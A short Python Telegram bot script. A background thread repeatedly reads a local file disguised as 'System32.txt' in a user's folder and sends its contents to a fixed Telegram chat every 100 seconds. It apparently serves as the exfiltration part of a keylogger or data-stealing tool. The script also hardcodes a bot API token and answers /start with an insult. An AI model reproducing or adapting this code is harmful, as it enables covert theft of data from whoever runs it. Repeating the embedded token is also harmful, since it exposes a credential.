import telebot
import time
import threading

API_TOKEN = '6071630449:AAHslhDKXn83m8gsfsB8m4_hQvw9-9N5pWE'
file_path = "C:\\Users\\kiril\\System32.txt"

bot = telebot.TeleBot(API_TOKEN)


def send_message_periodically():
    while True:
        with open(file_path, 'r') as file:
            try:
                file_contents = file.read()
            except:
                print('false')
        bot.send_message('973147838', file_contents)
        # bot.send_message('973147838', file_contents)
        time.sleep(100)


message_thread = threading.Thread(target=send_message_periodically)
message_thread.start()


@bot.message_handler(commands=['help', 'start'])
def send_welcome(message):
    bot.reply_to(message, """\
fuck you
""")


@bot.message_handler(func=lambda message: True)
def echo_message(message):
    bot.reply_to(message, message.text)


bot.infinity_polling()
